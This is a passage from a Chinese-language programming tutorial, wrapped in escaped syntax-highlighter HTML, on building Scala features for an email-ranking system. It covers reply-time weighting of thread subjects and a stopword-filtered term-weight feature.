&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;BarPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadGroupValues&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadGroupDescriptions&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-34&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setAxisLabel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Weighted amount of emails per subject&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0053 seconds] --&gt;
&lt;p&gt;注意代码中我们是如何确定时间差的，并将其除以 1000。这是为了把时间单位从毫秒化成秒。此外，我们用一个主题的频率除以时间差来计算权重。因为该值很小，我们对其取 log10 函数以使它放大一些。但这样做会把数值变负数，因此，我们将每个数值都加上 10 使其为正数。这个加权过程的结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/f8e31eda7bb0dc1714385b5a508d971c.jpg&quot; width=&quot;400px&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们想要的数值大概落在 4.4 到 8.6 的范围，这表明异常值对特征的影响已经很小。此外，我们观察权重最高的 10 个主题和最低的 10 个主题，看看到底发生了什么。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;权重最高的 10 个主题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/89462cebf674947e015e614e95b077ce.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59781&quot; src=&quot;/images/jobbole.com/ee73bbd31966047372567ccb05af143e.jpg&quot; alt=&quot;lk&quot; width=&quot;800&quot; height=&quot;263&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;权重最低的 10 个主题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/1e2f0a44972033747b5f53713f5832fa.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59782&quot; src=&quot;/images/jobbole.com/ef9e391eec6196485890c5c2fac7290d.jpg&quot; alt=&quot;gfc&quot; width=&quot;803&quot; height=&quot;267&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可以看到，权重最高的是那些短时间内就收到回复的邮件，而权重最低的则是那些回复等待时间很长的邮件。这样的话，即使是那些频率很低的主题也可以根据其往来邮件之间时间间隔短而被排在重要的位置。因此，我们可以得到两个特征：来自发送人的邮件数量 mailsGroupedBySender 和属于一个已知邮件会话的邮件的权重 threadGroupedWithWeights。&lt;/p&gt;
&lt;p&gt;如前所述，我们的排序系统是要基于尽可能多的特征的，我们继续找下一个特征。这个特征是以我们刚刚计算出的权重值为基础的。我们的想法是，邮箱会收到带有不同主题的新邮件。不过，这些邮件的主题有可能含有类似于之前收到的重要邮件主题的关键词。因此，在一个邮件会话（一个主题下的多封往来邮件）开始之前，我们就能够将邮件排序。为此，我们把关键词的权重指定为含有这些关键词的主题的权重。如果多个主题都含有这些关键词，我们就选择权重最高的一个排在第一位。&lt;/p&gt;
&lt;p&gt;这个特征有个问题，那就是停用词。还好，目前我们有一个停用词文件可以让我们剔除（大部分）英语停用词。然而，当你在设计自己的系统时，还应该考虑到可能会有多种语言出现，这时你就要剔除所有这些语言的停用词了。此外，在不同的语言中，某些单词会有多种不同的意思，因此，在这种情况下剔除停用词就要小心了。就现在来说，我们继续剔除英语停用词。这个特征的代码如下：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06137a369062474&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
  def getStopWords: List[String] = {
    val source = scala.io.Source
        .fromFile(new File(&quot;/Users/../stopwords.txt&quot;))(&quot;latin1&quot;)
    val lines = source.mkString.split(&quot;n&quot;)
    source.close()
    lines.toList
   }

//Add to top:
//添加到顶部
val stopWords = getStopWords

val threadTermWeights =  threadGroupedWithWeights
    .toArray
    .sortBy(x =&amp;gt; x._4)
    .flatMap(x =&amp;gt; x._1
            .replaceAll(&quot;[^a-zA-Z ]&quot;, &quot;&quot;)
            .toLowerCase.split(&quot; &quot;)
            .filter(_.nonEmpty)
            .map(y =&amp;gt; (y,x._4)))

val filteredThreadTermWeights = threadTermWeights
    .groupBy(x =&amp;gt; x._1)
    .map(x =&amp;gt; (x._1, x._2.maxBy(y =&amp;gt; y._2)._2))
    .toArray.sortBy(x =&amp;gt; x._1)
    .filter(x =&amp;gt; !stopWords.contains(x._1))&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06137a369062474-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06137a369062474-26&quot;&gt;26&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;getStopWords&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Source&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/Users/../stopwords.txt&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;latin1&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mkString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-9&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Add to top:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-10&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//添加到顶部&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-11&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStopWords&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-13&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadTermWeights&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;threadGroupedWithWeights&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;flatMap&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;[^a-zA-Z ]&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-21&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-22&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;filteredThreadTermWeights&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;threadTermWeights&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06137a369062474-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06137a369062474-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;maxBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span 